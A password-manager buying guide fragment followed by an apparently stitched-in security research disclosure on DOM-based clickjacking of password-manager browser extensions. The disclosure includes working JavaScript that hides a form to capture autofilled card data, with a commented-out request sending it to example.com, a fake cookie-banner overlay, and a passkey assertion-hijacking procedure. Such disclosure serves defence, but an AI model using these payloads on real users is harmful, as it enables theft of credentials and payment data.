let you know straight away.\nOf course, many of you will probably be aware by now of the breach suffered by LastPass, one of the most popular password managers around, where users\u2019 password vaults were stolen. The company did assure them that they remained encrypted, so unless the hackers also guessed their master passwords too, they should remain safe. However, other personal data that were stolen, including names, payment information and the addresses of their IP, email and physical location, were not encrypted. For these reasons, LastPass no longer makes it onto our list of the best password managers.\nSpeaking of encryption, all good managers will use the strongest methods available when storing user passwords in their databases, which are extremely difficult to crack without the digital keys needed to unlock them. So the question then becomes can a hacker obtain these keys? In the case of LastPass, its subsidiary, GoTo, recently announced the encryption keys for its users\u2019 accounts were stolen in the same attack that affected the password manager, but it is yet to confirm whether the same is true for its service.\nLastPass isn\u2019t the only password manager to succumb to a breach, however. Many Norton LifeLock users had their accounts hacked in late 2022 via a credential stuffing attack, with the company warning them that unwarranted access to the suite\u2019s password manager may have occurred.\nPasswordstate also saw its users fall victim to a devious fake software update that stole their stored passwords. Unsurprisingly, none of these password managers made it onto our list.\nShould you use your browser to manage your passwords?\nIt of course makes sense from a convenience perspective to use your browser\u2019s integrated password manager, such as that in Google Chrome. And although it is a perfectly solid choice, there are various reasons why you may want a dedicated password manager instead or in addition to your browser\u2019s.\nFirstly, your browser\u2019s password manager will likely not work with other devices quite so easily.\nIf you use Google Chrome on a desktop and have an iPhone, then passwords associated with apps will not be saved to the manager in Chrome - by default they will be saved to Apple\u2019s own password manager, Keychain. Keychain and Chrome password managers will not sync together, and there is no browser extension for Keychain that will work on Chrome. Therefore, you will be running two managers concurrently, one used for mobile app passwords, and the other for website passwords. If you have an account for a service that has both a website and an app, then they will be saved to both managers separately.\nAs you can imagine, things can start to get messy and disorganized fast. The solution would be to have a dedicated, third-party manager like those on this list, so they can centralize and sync all your passwords for both websites and apps across all your devices. They will usually have an app for mobile and for desktop, as well as an integrated extension compatible with most common web browsers, so no matter what platform you\u2019re on, you\u2019ll always have access to your passwords.\nSecondly, dedicated password managers often come with a lot more useful extras. For instance, a small but useful feature of many password managers is the ability to give a nickname to your account passwords, so you can locate them easily. Sometimes, you will find that searching for your account credentials by username or by the URL that the account is stored on may not yield the results you're looking for.\nWhere to find the password manager on Chrome\nGoogle Chrome is the most popular web browser in the world right now, so there\u2019s a good chance you're using its integrated password manager already.\nOn desktop platforms, you\u2019ll find it under settings - autofill - password manager. You can see all your passwords here, and search for them via their username or the web page they are used on. It will also show you any passwords that have been compromised, based on known data breaches and leaks.\nThere is also the Google Password manager, which is the official password manager for Android, and has now taken over the integrated manager in Chrome as well. This means it now stores passwords you use on Android apps as well, not just website passwords.\nDo password managers work with apps?\nAll the best password managers will have an app associated with them, and will work on both Android and Apple iOS devices. This means that passwords you use for other apps will be able to be stored in your password manager and easily accessible on your device, allowing for instant login.\nThey will be cross-platform, so can be used across all your different devices, as well as having an extension you can download to allow them to work in popular browsers, such as Google Chrome and Apple's Safari.\nHowever, as many smart devices now have biometric login capabilities, such as using fingerprint scanners and facial recognition, a lot of apps will simply require this to log in instead, without the need to input a password every time. This biometric data is stored on the device itself, such as your iPhone or Android phone, so a password manager isn\u2019t used in these cases.\nHowever, many password managers now support biometric data too, so you can save it to the manager as well.\nHow to choose the top password managers\nChoosing the best password manager comes down to your personal needs, and whether others will be using it in addition to yourself, such as your family or the rest of your business.\nThe top two on our list, NordPass and Dashlane, are arguably the best all-round password managers available, more than capable of servicing anyone from single users to large organizations. But if you don\u2019t want to pay a penny for a password manager, then there\u2019s only one choice in our view: Bitwarden.\nHere are some key considerations when choosing a password manager:\n1. Security: This is of course one of the most important aspects of any password manager. We have done our best to check every manager featured in this guide adheres to best practices in terms of securing your vault and personal data.\nThey will use industry standard encryption methods to ensure that no one knows what your passwords are. Some will also offer biometric login in addition to or instead of a master password, and many will also offer two-factor authentication (2FA) to help prevent hackers accessing your account if they somehow manage to steal your master password.\nMany are also starting to support passkeys as a way of logging in too, which are thought to be both easier and more secure than using a master password.\n2. Synchronization: Although many other vendors will offer free versions of their managers, be aware that oftentimes, some fairly basic features will be omitted, such as cross-platform synchronization and unlimited storage and devices. Bitwarden does include these, though.\n3. Compatibility: We\u2019ve also indicated what platforms and browsers each manager is compatible with, which is another very important consideration when choosing a password manager. In fact, it is one of the main advantages of using a third-party password manager in the first place, since managers integrated with Apple, Google and Microsoft products will usually only work within their respective ecosystems.\nThe managers in this list, though, will work across at least some of them, since they will be compatible with Windows and Mac (and even Linux in some cases), as well as Android and iPhone.\nFor those who value the utmost privacy when online, you should look for a password manager that has a browser extension for specialist privacy browsers, like Brave. Again, we\u2019ve done our best to inform you which browsers and platforms each manager works with.\n4. Price: When it comes to price, bear in mind that while many will show monthly costs, they will often bill you annually, so keep in mind that you will have to part with a larger sum rather than spreading the cost throughout the year.\nMost managers on the market today will charge anywhere from $10 to $60 a year for individual plans, with family plans being somewhat more expensive. Business plans, on the other hand, can be more costly, and some even offer tailor-made enterprise plans that will require consultation before getting a quote.\nHow we tested the best password managers\nWe tested close to 30 of the most prominent password managers around, and picked out the very best to feature in this guide. During our testing, we made sure to try them out on every platform possible, to make sure they offered a consistent experience across all manner of devices and browsers.\nWe spent a considerable amount of time with each password manager to ensure that there were no nasty surprises that wouldn't necessarily crop up during a brief run through. We also tried to use them in every kind of situation we could think of, again in an effort to reveal any shortcomings that may have otherwise gone unnoticed.\nThe last thing you want to do is to change your password manager after discovering major flaws or aspects that you personally can\u2019t live with, so we do our best to be as thorough as possible and consider all the different types of users that will deploy password managers for their specific wants and needs.\nHowever, it is worth noting that good password managers usually offer easy ways to export your vault from one manager to another, so if you don\u2019t personally like a manager after spending a lot of time with it, don\u2019t feel you\u2019re stuck; most vendors offer easy-to-follow guides on switching to their manager from others - they want to win your custom, after all.\nRead more on how we test, rate, and review products on TechRadar.\nGet in touch\n- Want to find out about commercial or marketing opportunities?

      "text": "DOM-based Extension Clickjacking: Your Password Manager Data at Risk\n9 August 2025 (Updated: 22 August 2025)\nThis security research was presented at DEF CON 33: PDF presentation\nSince the research was presented at DEFCON (August 9, 2025), several updates have been made:\nUpdate 22.8.2025:\nBitwarden: 2025.8.1 (in progress), <=2025.8.0 (vulnerable)\nEnpass: 6.11.6 (fixed) - released: 13.8.2025, <=6.11.5 (vulnerable)\nKeePassXC-Browser <=1.9.9.2 (latest) is vulnerable\n+ New demo sites for: 1Password, Bitwarden, iCloud Passwords, KeePassXC-Browser, LastPass\n+ \"Password Managers: Vulnerable & Fixed Versions\" updated with the latest versions and videos\nIs clickjacking still an exploitable vulnerability nowadays? Many bug bounty programs have this vulnerability listed in the \"out of scope\" section, and in better cases they accept it but don't reward it. The reason is that there are many protections available today that significantly reduce the impact of this vulnerability. It can be said that a common web clickjacking vulnerability has already been solved and can be easily defended against.\nThe result of my research is that clickjacking is still a security threat, but it's necessary to shift from web applications to browser extensions, which are more popular nowadays (password managers, crypto wallets and others).\nI described a new attack technique with multiple attack variants and tested it against 11 password managers. This resulted in discovering several 0-day vulnerabilities that could affect stored data of tens of millions of users.\nA single click anywhere on a attacker controlled website could allow attackers to steal users' data (credit card details, personal data, login credentials including TOTP). The new technique is general and can be applied to other types of extensions.\nTable of contents:\n- Key Information\n- Introduction\n- Browser Extension Clickjacking\n- IFRAME-based\n- DOM-based Extension Clickjacking\n- Extension Element\n- Parent Element\n- Overlay\n- Position\n- Password Managers: Test Results\n- Detection\n- Impact\n- Password Managers: Vulnerable & Fixed Versions\n- Demo Sites\n- Users at Risk\n- Limitation\n- Mitigation\n- Recommendations for Users\n- Conclusion\nKey Information\n\u2022 A new clickjacking technique where a malicious script manipulates UI elements that browser extensions inject into the DOM by making them invisible using javascript.\n\u2022 In my research, I selected 11 password managers that are used as browser extensions and the result was that all were vulnerable to \"DOM-based Extension Clickjacking\". Tens of millions of users could be at risk (~40 million active installations).\n\u2022 A single click anywhere on the attacker's website could leak credit card details including security codes (6 out of 9 were vulnerable) or exfiltrate stored personal information (8 out of 10 vulnerable).\n\u2022 All password managers filled credentials not only to the \"main\" domain, but also to all subdomains. An attacker could easily find XSS or other vulnerabilities and steal the user's stored credentials with a single click (10 out of 11), including TOTP (9 out of 11). In some scenarios, passkey authentication could also be exploited (8 out of 11).\n\u2022 All vulnerabilities were reported in April 2025 with a notice that public disclosure will be in August 2025. Some vendors have still not fixed described vulnerability: Bitwarden, 1Password, iCloud Passwords, Enpass, LastPass, LogMeOnce. Users of these password managers may still be at risk (~32.7 million active installations).\n\u2022 For Chromium-based browser users it is recommended to configure site access to \"on click\" in extension settings. This configuration allows users to manually control autofill functionality.\n\u2022 The described technique is general and I only tested it on 11 password managers. Other DOM-manipulating extensions are probably vulnerable (password managers, crypto wallets, notes etc.).\nIntroduction\nIntrusive Web Elements\nWhile browsing websites, users often encounter intrusive web elements that block immediate access to target content. These elements require users to click to close them.\nThe most common intrusive elements requiring user action:\n- Cookie consent banners - 1 click (accept/decline cookies)\n- Newsletter popup, login dialog - 1 click (closing dialog)\n- Web push notifications - 1 click (accept/decline)\n- Cloudflare challenge pages / Captcha pages - 1 click (Verify you are human)\n2 clicks if verification fails, 4 or more clicks if captcha needs to be solved\n1-3 clicks from the user are commonly required before accessing content.\nBecause users expect to interact with these elements, I will use fake intrusive web elements in a clickjacking exploit to trick the user into clicking.\nClickjacking (Web Application)\nClickjacking (or \"UI redressing\") is a client-side attack technique that exploits visual layering to hijack user clicks intended for legitimate interface elements. This attack uses invisible frames (iframes) to deceive users who believe they are clicking on legitimate website elements, while actually performing actions that benefit the attacker.\nBasic attack principle:\n- Attacker creates a malicious page with an invisible iframe containing the target website (opacity:0).\n- User visits the malicious page and clicks on apparently legitimate visible elements.\n- Clicks are actually intercepted by the hidden iframe, performing unwanted actions on the target site.\n<iframe src=\"https://targetsite.com\" style=\"opacity:0\"></iframe>\nTo mitigate security impact, security headers X-Frame-Options or Content-Security-Policy are used.\nX-Frame-Options: DENY\nX-Frame-Options: SAMEORIGIN\nX-Frame-Options: ALLOW-FROM https://example.com\nContent-Security-Policy: frame-ancestors 'none';\nContent-Security-Policy: frame-ancestors 'self';\nContent-Security-Policy: frame-ancestors https://example.com\nAdditionally, the SameSite Lax or Strict cookie attribute can be set to prevent cookie usage in cross-site iframes.\nSameSite=Lax cookies in cross-site POST request or cross-site iframes are blocked\nSameSite=Strict cookies only for same-site requests\nSameSite=None allowed cookies for cross-site requests\nDefault value is SameSite=Lax if SameSite isn't specified.\nClickjacking in web applications has minimal security impact in most cases because users are not authenticated in the loaded iframe and therefore preventing any malicious actions from being executed.Password Managers\nPassword managers are widely used as browser extensions to simplify website authentication. In this research, I tested 11 password managers using a new technique.\nFor reference, the article The Best Password Managers for 2025 by PCMag was used for the selection of 10 password managers.\nThe following password managers were listed there:\n- 1Password\n- Bitwarden\n- Dashlane\n- Enpass\n- Keeper\n- LastPass\n- LogMeOnce\n- NordPass\n- ProtonPass\n- RoboForm\nI also added iCloud Passwords to this list because it is widely used (5.4 million active installations - Chrome Web Store, Firefox Add-ons, Edge Add-on).\nI want to mention that iCloud Passwords was tested only as a browser extension (Google Chrome, Firefox, etc.) and not as a system application with Safari integration.\nAutofill featurePassword managers have autofill functionality that can be of 2 types:\n- Automatic autofill - credentials are automatically filled in (0-click)\n- Manual autofill - user interaction is required to fill in credentials (selecting from a dropdown menu)\nMy research focuses on clickjacking, so click is required and I was focus only on manual autofill.\nOn automatic autofill I published research in 2021 (blog).\nBrowser Extension Clickjacking\nClickjacking vulnerability in browser extensions works similarly to web applications. Through clicking, the user unknowingly performs an action that causes their browser extension to execute malicious activity such as data exfiltration, functionality deactivation, stored note deletion and others.\nBrowser extension clickjacking can currently be categorized into 2 types:\n- IFRAME-based - publicly described type (web_accessible_resources)\n- DOM-based - new described type\nI will first describe the IFRAME-based variant, which was not the research focus but may be unknown to many people.\nIFRAME-based\nA publicly documented clickjacking technique for browser extensions exploits misconfigured web_accessible_resources in the manifest.json file.\nmanifest.json is the main configuration file of a browser extension. It contains basic information such as the extension\u2019s name, version, and description, as well as settings that define what scripts, icons, and permissions the extension uses. Without this file, the browser cannot recognize or run the extension.\nChromium-based path:\nchrome-extension://<extension_ID>/manifest.jsonMozilla Firefox path:\nmoz-extension://<extension_ID>/manifest.jsonLocal device path:\n%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Extensions\\<extension_ID>\\<version>\\manifest.json\nIn the web_accessible_resources part, developers explicitly define files (HTML, scripts, styles, images) that should be accessible from web pages outside the extension interface itself. If developers don't specify sufficient restrictions, attackers can abuse these resources.\nUsage\nWhen files with significant functionality (HTML files) are defined in web_accessible_resources, an attacker can create a page that loads this file into a transparent iframe and tricks users into unknowingly clicking on extension elements.\nThis uses basically the same principle as web application clickjacking.\nBasic usage:\n<iframe src=\"chrome-extension://<extension_ID>/file.html\" style=\"opacity:0\"></iframe>\nExample\nAlthough this isn't a new technique and information has been available for several years, some extensions still have this security vulnerability. In this research focused on password managers, one of them had this issue.\nIn December 2023, I reported this clickjacking vulnerability in the NordPass password manager. Due to incorrect web_accessible_resources definition, it was possible to load the entire password manager UI in an iframe.\nWith 4 clicks, it was possible to share all items from the password manager to an attacker's account. The result was that the attacker gained access to all stored passwords, credit cards, and personal data without the user's knowledge.\nVictim's view (opacity:0)\nSemi-transparent (opacity:0.5)\nBecause the victim was required to perform several clicks (select all, share items...), a fake Cloudflare captcha page was created as proof-of-concept. By completing the captcha, the attacker gets all data from the password manager.\nA major problem here was also that the victim received no notification about the shared files.\nI was awarded a $10,000 bounty for this vulnerability.\nTip: How did I know that the user clicked into the iframe so I could change the position?\nI used an off-viewport element that has onblur=\"iframeClick()\". If a user clicks into the iframe => the element lost focus and iframeClick() was executed, which changed the position and set focus again for that element.\nIn the past, the MetaMask cryptocurrency wallet, for example, had the same vulnerability (source, source2).\nManifest\nWith Manifest V3, resource access is now explicitly controlled through the matches parameter, requiring developers to define the exact origins from which resources may be loaded.\n\"web_accessible_resources\": [\n{\n\"resources\": [\"image.png\", \"script.js\"],\n\"matches\": [\"https://example.com/*\"]\n}\n]\nIn Manifest V2, there was no restriction to specific sources, making it always possible to load files from any domain.\n\"web_accessible_resources\": [\n{\n\"resources\": [\"image.png\", \"script.js\"]\n}\n]\nProtection\nOnly necessary files should be defined in the web_accessible_resources.\nWhen exposing HTML or script files that enable extension interaction, such as state modification, background script communication, or sensitive operations restrict access using the matches parameter to limit loading to specific trusted domains.\nAdditional protection requires implementing X-Frame-Options: DENY headers or Content-Security-Policy: frame-ancestors 'none'. These headers must be applied to all HTML responses served through web_accessible_resources.\nDOM-based Extension Clickjacking\nA new clickjacking technique where a malicious script manipulates UI elements that browser extensions inject into the DOM.\nThe principle is that a browser extension injects elements into the DOM, which an attacker can then make invisible using javascript.\nTo change visibility is used opacity:0 to various elements or overlay UI components.\nIn my case, focusing on password managers, the manual autofill feature was used to increase impact.\nPassword Manager Exploit Steps:\n- Create an intrusive element (cookie consent, cloudflare captcha etc.)\n- Create a form (login, personal data... )\n- Set transparency for the form (opacity: 0.001)\n- Use focus() for the form input \u2192 the autofill dropdown menu will appear\n- Make the UI invisible with DOM-based Extension Clickjacking\n- Victim accepts/rejects cookies = clicks on the invisible UI\n\u2192 data will be filled into the newly created form (2.)\n\u2192 attacker gets data from the form values\nTypes & Subtypes:\nDOM-based Extension Clickjacking can be divided into several types/categories. Each manipulates DOM elements differently, but the result is always the same - the UI is invisible but clickable.\nDOM-based Extension Clickjacking\n\u251c\u2500\u2500 Extension Element\n\u2502 \u251c\u2500\u2500 Root Element\n\u2502 \u2514\u2500\u2500 Child Element\n\u251c\u2500\u2500 Parent Element\n\u2502 \u251c\u2500\u2500 BODY\n\u2502 \u2514\u2500\u2500 HTML\n\u2514\u2500\u2500 Overlay\n\u251c\u2500\u2500 Partial Overlay\n\u2514\u2500\u2500 Full Overlay\nExtension Element\nThis is the most basic type, discovered in November 2023, which initiated this entire research. I initially reported only this variant. Later, in early 2025, I identified two additional types and documented the complete DOM-based technique.\nIn this type, the\nRoot Element\nThe user sets opacity directly on the extension's root element.\ndocument.querySelector(\"root-element\").style.opacity = 0;\nFor example, Proton Pass was vulnerable to this type of attack. To change visibility, the following code was used:\ndocument.querySelector(\"protonpass-root\").style.opacity = 0.5;\nChild Element\nThe user sets opacity on the extension's child elements. This usually occurred when a Shadow Root (open) was used, making the element accessible.\ndocument.querySelector(\"child-element\").style.opacity = 0;\nProton Pass remained vulnerable after the \"Root Element\" fix since child elements were still modifiable. Attackers had to just identify the root element name (changing per page refresh) before modifying child element opacity.\n// find root element\nconst x = Array.from(document.querySelectorAll('*'))\n.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'));\nx.shadowRoot.querySelector(\"iframe\").style.cssText += \"opacity: 0 !important;\";\nParent Element\nIn this type, the user sets\nBODY\nThe user sets opacity:0 for <body> element, which makes the extension UI transparent.\nAfter this setting, the <body> will be invisible, so the user sets a background-image on the <html> element.\nThe background image used is a screenshot of the website (can be used image or svg).\ndocument.body.style.opacity = 0;\ndocument.documentElement.style.backgroundImage = url(\"website.png\");\nExploit code: Parent Element - BODY\n// CREDIT CARD FORM\nvar cardform = document.getElementById('cardform');\nif (!cardform) {\ncardform = document.createElement('cardform');\ncardform.id = 'cardform';\ncardform.style = \"position: fixed; bottom: 0px; left:0px; z-index: 2147483647; opacity:0.1\";\ncardform.innerHTML = `<form method=\"post\" name=\"card\" onchange=\"getCardValues()\" action=\"/\" id=\"creditcard\" autocomplete=\"off\" novalidate=\"\" style=\"opacity:0.1\">\n<input type=\"text\" id=\"cardnumber\" name=\"cardnumber\" placeholder=\"\" autocomplete=\"cc-number new-password\" maxlength=\"19\" inputmode=\"numeric\" pattern=\"\\d*\" style=\"cursor:pointer\">\n<input type=\"text\" id=\"expiry\" placeholder=\"\" autocomplete=\"off\" inputmode=\"numeric\" pattern=\"\\d*\" autofocus>\n<input type=\"text\" name=\"cvc\" id=\"cvc\" placeholder=\"\" autocomplete=\"cc-csc new-password\" maxlength=\"3\" inputmode=\"numeric\" pattern=\"\\d*\">\n</form>`;\ndocument.body.appendChild(cardform);\n}\n// SET BACKGROUND-IMAGE\nwindow.setTimeout(function(){\ndocument.querySelector(\"html\").style.backgroundImage = \"url(website.png)\";\ndocument.getElementById('cardform').style = \"position: fixed;top: 453px;left: 467px;z-index: 2147483647;\";\ndocument.getElementById('cardnumber').focus();\ndocument.querySelector(\"body\").style.opacity = \"0.001\";\n}, 1000);\n// GET DATA FROM INPUTS\nfunction getCardValues() {\nvar cardnumber = document.getElementById('cardnumber').value;\nvar expiry = document.getElementById('expiry').value;\nvar cvc = document.getElementById('cvc').value;\nif (expiry && cvc) {\n// DATA WILL BE IN CONSOLE\nconsole.log(\"cardnumber=\"+cardnumber+\"&expiry=\"+expiry+\"&cvc=\"+cvc);\n/* Sending data to external server\nvar xhttp = new XMLHttpRequest();\nxhttp.open(\"GET\", \"https://example.com/?cardnumber=\"+cardnumber+\"&expiry=\"+expiry+\"&cvc=\"+cvc, true);\nxhttp.send();\n*/\n// AFTER STEALING DATA - OPACITY:1 FOR BODY\ncardform.style.display = \"none\";\ndocument.querySelector(\"body\").style.opacity = \"1\";\ndocument.querySelector(\"html\").style.backgroundImage = \"\";\n}\n}\nHTML\nThe user sets opacity:0 for <html> element, which makes everything transparent.\nVictim must click on blank page, that less practical but still exploitable.\nMust to be created \"clicking\" game - Reaction Time or Visual Memory Test. For example, the user might have to click on a white screen to test how fast their reactions are.\ndocument.documentElement.style.opacity = 0;\nOverlay\nIn this type, the user does not change the opacity but overlays the UI.\nPartial Overlay\nThe user creates elements around the extension UI with only a few pixels remaining visible (small clickable area).\nThe goal is that injected elements must be last in the DOM with maximum z-index value. Extension elements in many cases also have the maximum z-index value - the last element in the DOM will be 'on top'.\nOr using Popover API for these elements (=top layer element). In some cases, it's necessary to use both methods = the last popover element in DOM.\nThe user then creates a UI for these elements that forces the user to click - background image for new elements (website screenshot) or inserted HTML code with intrusive web elements.\nFull Overlay\nThe user creates an element that covers the entire extension UI.\nBecause it's completely covered, it would normally not be clickable but with using\nSame as \"Partial Overlay\", the goal is that injected elements must be last in the DOM with maximum z-index value. Or using Popover API for these elements (=top layer element). In some cases, it's necessary to use both methods = the last popover element in DOM.\nPopover is used with\nTo display the Popover element, the following code is used:\ndocument.getElementById('x').showPopover();\nThe user then creates a UI for these elements that forces the user to click - background image for new elements (website screenshot) or inserted HTML code with intrusive web elements.\nExploit code: Full Overlay\n// COOKIE BANNER\nconst dialog = document.createElement(\"cookie\");\ndialog.innerHTML = `<div id=\"popover\" popover=\"manual\" style=\"pointer-events: none; display: none; position: fixed; top: 0px; left: -10px; width: 101%; height: 101%; opacity:0.5\"><div id=\"overlay\"></div><style>.no-scroll {overflow: hidden;} #overlay {position: fixed; display: block; width: 100%; height: 100%; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0,0,0,0.5); animation: .5s showoverlay; } #overlay.remove-overlay {animation: .5s hideoverlay; opacity: 0; } @keyframes showoverlay {from { opacity: 0; } to { opacity: 1; } } @keyframes hideoverlay {from { opacity: 1; } to { opacity: 0; } } #cookie-dialog {display: block!important; position: relative!important; opacity: 1!important; visibility: visible!important; margin: 290px auto 0!important; width: 650px!important; -webkit-box-sizing: content-box!important; -moz-box-sizing: content-box!important; box-sizing: content-box!important; max-width: 90%!important; background: #ffffff!important; padding: 12px 24px!important; overflow: hidden!important; z-index: 9999!important; border: 10px solid #5fa624!important; box-shadow: #333 1px 1px 10px 1px!important; line-height: 1.2!important; text-align: left!important; } #cookie-div {font-family: Arial,serif!important;width: 100%!important;height: 100%!important;margin: 0 auto!important;position: fixed!important;top: -280px !important;left: 0px !important;font-family: Arial,serif!important;z-index: 2258594000!important;} #cookie-dialog h2 {font-size: 20px!important; line-height: 16px!important; font-weight: 700!important; margin: 10px 0 16px!important; } #cookie-dialog p {margin: 12px 0!important; line-height: 16px!important; text-indent: 0!important; font-weight: 400!important; font-size: 10pt!important; } #cookie-dialog #button-row {display: flex!important; flex-wrap: nowrap!important; justify-content: space-between!important; margin-right: 265px!important; } .btn {border: 1px solid #000000!important; font-family: Arial,serif!important; color: #000000!important; background: #ffffff!important; padding: 7px 10px!important; text-decoration: none!important; } #cookie-dialog #accept-all {border: none!important; color: #ffffff!important; background: #5fa624!important; text-decoration: none!important; } #links {display: flex!important; font-size: 12px!important; margin-top: 20px!important; } #cookie-dialog a {color: #5fa624!important; text-decoration: none!important; } #cookie-dialog a:hover {cursor: pointer!important; } .bar {margin: 0 5px!important; width: auto!important; height: auto!important; position: relative!important; } #accept-all:hover {cursor: pointer!important; background: #5fa624!important; text-decoration: none!important; } .btn:hover {cursor: pointer!important; background: #ffffff!important; text-decoration: none!important; }</style><div id=\"cookie-div\"><div id=\"cookie-dialog\"> <div> <h2>Privacy & Transparency</h2> <p>We and our partners use cookies to Store and/or access information on a device.

This allows an attacker to use one universal script against all the described password managers.\nLock/Unlock Detection\nBy analyzing DOM element attributes, attackers can determine whether a password manager is currently locked or unlocked.\nAn attacker therefore doesn't need to display \"cookies\" elements to obtain clicks, since they know the attack wouldn't be successful. Alternatively, they can use various social engineering techniques to cause the password manager to be unlocked.\nImpact\nBecause the exploit script uses manual autofill functionality, the impact is categorized by the type of data that are filled in.\nAttacker\u2019s website\nAn attacker can use their own website with javascript exploit and can exfiltrate these data:\nPersonal Data- name, email, phone, address, date of birth (some password managers)\n\u26a0\ufe0f This data is not domain-specific = can be autofilled on any website \u26a0\ufe0f\n*Keeper was not exploitable for these data on attacker's website\n1 click on an attacker's website\n\u2192 the attacker has your stored credit card details or your personal information.\n2 clicks and the attacker has both data (credit card details + personal data)\nIn the following video, the user uses RoboForm and the attacker forces the user to make 2 clicks \u2192 the attacker exfiltrates the user's credit card details and personal data\nSame example but with opacity:0.5 - RoboForm UI more visible\nProtonPass is marked as \"Not supported\" because it doesn't have autofill for credit cards, only copy/paste can be used. However, autofill functionality was planned (roadmap for spring 2025).\n1Password is marked as \"not vulnerable\" (\u2705) for Credit Card because user has to click on \"OK\" in dialog. But there was a problem with the dialog text \u26a0\ufe0f.\nOnly when filling credit card details was a generic consent dialog displayed for filling a \"1Password item\". After confirmation, the credit card was filled in. This dialog only appeared for credit cards, and users could be confused about what data was actually being filled.\nThe following video exploits this generic text:\n- First, the attacker exfiltrates personal data (including the email address).\n- Next, an email input is shown for entering an email address to receive a discount coupon.\n- The user is shown a generic consent dialog to fill in a \"1Password item\" (the user does not realize this is the credit card).\n- After confirmation, the attacker steals the credit card details and fills the input field with the user's email address exfiltrated in 1). \u2192 Credit card autofill wasn't vulnerable to clickjacking, but could still be exploited due to generic dialog text.\n1Password: Personal Data + Credit Card, generic text in alert (opacity:0)\n1Password: Personal Data + Credit Card, generic text in alert (opacity:0.5)\nWebsite with vulnerability (e.g. XSS)\nIn this case, the attacker needs to find some vulnerability, such as XSS, subdomain takeover, web cache poisoning or other. The goal is for the attacker to be able to execute their javascript code on a trusted domain. For simplicity, I will use \"XSS\" beacuse it's the most common type of vulnerability in web applications.\nThe attacker can exfiltrate these data:\nPassword managers allow not only storing credentials, but also storing TOTP (Time-based one-time password). If a user saves TOTP in the password manager instead of in another application (Google Authenticator), the attacker could also exfiltrate TOTP, often without additional user interaction.\nDomain autofill\nThe attacker can only steal credentials for the vulnerable domain.\nBut on the other hand, there is a huge advantage for the attackers. \u26a0\ufe0f All password managers fill credentials not only into the same domain where the credentials were stored, but also into all subdomains or parent domain in default configuration \u26a0\ufe0f.\n| Credentials Saved | Autofilled (manual autofill) |\n|---|---|\n| example.com | |\n| example.com | |\n| example.com |\nSubdomain autofill in Keeper. Other password managers have same behaviour \u26a0\ufe0f.\nIf a user has stored credentials for Google account, they will have them saved for: accounts.google.com\nThe attacker only needs to find XSS, for example, on test.dev.sandbox.cloud.google.com and still he can use \"DOM-based Extension Clickjacking\" technique and steal user's credentials for Google account.\nSo the attacker isn't limited to a small scope, he can find vulnerabilities anywhere on: *.example.com/*\n*automatic autofill enabled by default (0-click autofill)\nPoC Video:\nIn the following video, the attacker found an XSS vulnerability on a trusted domain (issuetracker.google.com) and shared a link on a social network:\n\u2192 the victim makes 3 clicks on fake intrusive elements\n\u2192 the attacker stole data: login credentials + TOTP (stored for accounts.google.com), credit card details, personal data\nBesides login credentials, another impact can be:\n\u2192 attacker creates a new session for victim account\nPasskeys are very strictly domain-limited and it's not possible to find a vulnerability on a subdomain in this case. The only exception would be if CORS requests to the passkeys auth server were allowed for the subdomain.\nIn some cases, it was possible to exploit passkey authentication using \"DOM-based Extension Clickjacking\". One method of exploitation was \"Signed Assertion Hijacking\".\nWhen creating a challenge, it is recommended that a session is also created on the server = session-bound challenge (source1, source2).\nThis is how the basic passkeys login flow looks like:\nIf the server doesn't create a session along with the challenge, it's possible to exploit the entire authentication flow. This results in \"signed assertion hijacking,\" where the attacker steals the signed assertion request and because nothing is required (no session), the attacker can use it to complete the login.\nHow does the attacker get this request? This can be done either by using XSS to intercept HTTP communication and forwarding the request to attacker server. Or by using XSS to modification the same passkey script but change the endpoint for the signed assertion. Again, they would send this request to their own server. This request is always one-time use, so XSS must be used to prevent the victim from sending it to the auth server.\nHow common is it for servers not to implement session-bound challenges? I looked at the FIDO Certified Showcase (\"The FIDO Company Showcase highlights FIDO Alliance members and their FIDO Certified solutions.\") and tested all passkey solutions (Category\u2192Passkeys). After filtering, I got 17 results. Not all solutions had a demo or SDK - I found 7.\nThe result was that 4 out of 7 did not implement \"session-bound challenge\", making this attack exploitable.\n\u2620\ufe0f Hanko - https://www.hanko.io (demo: https://www.passkeys.io)\n\u2620\ufe0f SK Telecom - https://www.sktelecom.com (demo: https://portal.passkey-sktelecom.com)\n\u2620\ufe0f NokNok - https://noknok.com (demo: https://bankauth.noknokdemo.com)\n\u2620\ufe0f Authsignal - https://www.authsignal.com (demo: https://demo.authsignal.com)\nOne example is the Hanko solution, used for the PoC demonstration (Hanko.io has 8,300 stars on GitHub).\nThe screenshot shows that the \"signed assertion\" request doesn't contain session data.\nUpon intercepting this request, an attacker can replay it to receive a \"200 OK\" response with a newly session (auth token).\nHow does the entire attack work?\n- The attacker finds XSS on a server where passkeys are used\n- Copies the entire passkey script and changes the \"signed assertion\" endpoint to their own server\n- Executes the passkey script via XSS and uses \"DOM-based Extension Clickjacking\" technique to hide the passkey dialog\n- The victim visits the URL with XSS vulnerability and clicks once (accept cookies = confirming the login via passkeys)\n- The attacker obtains the signed challenge (signed assertion), which is sent to their server\n- The attacker sends the signed assertion from their server to the auth server\n\u2192 because no session was required and the request contained a valid signed challenge, the entire request was valid and the attacker is logged in (newly created session)\nIn the following video, the victim uses ProtonPass and then makes a single click (accept cookies). The attacker gets \"signed assertion\" request and was able to send it to the server.\nBesides FIDO solutions, I found some others as well. I tested primarily on their demo solutions and again there was no \"session-bound challenge\" implementation.\nOther solutions without \"session-bound challenge\" implementation:\nPassage - https://passage.1password.com (demo: https://passage.1password.com/demo)\nCorbado - https://www.corbado.com (demo: https://passkeys.eu)\nDescope - https://www.descope.com (demo: https://www.passkeys.guru)\nIn many cases, passkey solutions do not verify users when adding additional devices \u26a0\ufe0f = the attacker is able to add their own device and thereby gain \"Persistent Access\".\n\u2192 he will always be able to log into the account using the added passkey (until the victim removes it)\nThe result is that if there were no clickjacking vulnerability in the password manager, this method would not be easily exploitable = the user would see a passkey dialog that they would have to confirm.\n1 click from the victim - the attacker has access to victim's account even when passkeys are used for authentication\n*automatic autofill enabled by default (0-click autofill)\nData Impact Summary\nCredit Card - credit card number, expiration date, security code\nPersonal Data - name, email, phone, address, date of birth (some password managers)\nLogin credentials - username, password, TOTP (2FA)\nPasskeys - signed assertion hijacking (authentication flow hijacking) = creating a new session\nPassword Managers: Vulnerable & Fixed Versions\n*automatic autofill enabled by default (0-click autofill)\nFixed means that only the described methods from this research are patched 